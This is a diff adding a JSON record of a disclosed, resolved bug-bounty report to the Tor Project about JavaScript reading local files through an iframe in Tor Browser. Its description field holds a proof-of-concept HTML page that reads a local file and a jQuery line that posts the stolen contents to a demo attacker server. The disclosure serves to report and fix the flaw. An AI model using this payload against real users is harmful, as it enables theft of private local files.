@@ -1,0 +1,120 @@
+{
+  "id": 258630,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTg2MzA=",
+  "url": "https://hackerone.com/reports/258630",
+  "title": "Access to local file system using javascript",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-08-10T14:59:01.413Z",
+  "submitted_at": "2017-08-10T14:59:01.413Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cuso4",
+    "url": "/cuso4",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/181/556/8167516100c0077da496fbf5c10e276d0417655e_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1800,
+    "url": "https://hackerone.com/torproject",
+    "handle": "torproject",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/800/6e575d0a9127b91e83833cf4a9e6be6e8b30cbc3_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Tor",
+      "twitter_handle": "torproject",
+      "website": "https://www.torproject.org/",
+      "about": "Anonymity Online"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-11-18T09:28:06.412Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-10-19T09:27:58.890Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Issue :\n\nAccess to local file system using javascript(slightly xss on server side )\n\nThe browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory.\n\n\nSteps to Reproduce :\n\n\nsave a html file from here and open in tor browser .\n\n<html>\n<body>\n<div id='div1'>\n</div>\n<script>\ncurrent_href = document.location.href\nframe = document.createElement('iframe'); frame.src = current_href.replace('file:///home/jnsjns/Desktop/poc5.html', 'file:///home/jnsjns/Desktop/1.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)\nsetTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML\nalert('Your data is: ' + loot)\n}, 500)\n</script>\n</body>\n</html>\n\n\n\nExplaination :  file:///home/jnsjns/Desktop/poc5.html  this is my test html here.\n\n                file:///home/jnsjns/Desktop/1.txt is server side local file in tor browser \n\nthe private file is coming by popup (I have tested in chrome -Google ,they are safe from this )\n\n\nWhat attacker can do ?\n\n\nI would have been able to post it to my server using jquery like this.\n\n//Gets data from iframe and saves it to the getdata variable\ngetdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML\n//Posts to the php server located at 192.168.0.102 (local address for demo purposes)\n$.ajax({type: \"POST\", url: \"http://192.168.0.102/post.php\", data: {string:getdata}});}\n\n\nThis issue may critical .\n\n\nRegards.\n\n\n\n\n",
+  "weakness": {
+    "id": 57,
+    "name": "Violation of Secure Design Principles"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-11-18T09:27:58.935Z",
+  "allow_singular_disclosure_after": -267343036.61568263,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "jensec",
+    "tess",
+    "sameerphad72",
+    "xnutronex",
+    "reactors08",
+    "0xdeadbife",
+    "ankitsingh",
+    "eveeez",
+    "khizer47",
+    "linkks",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
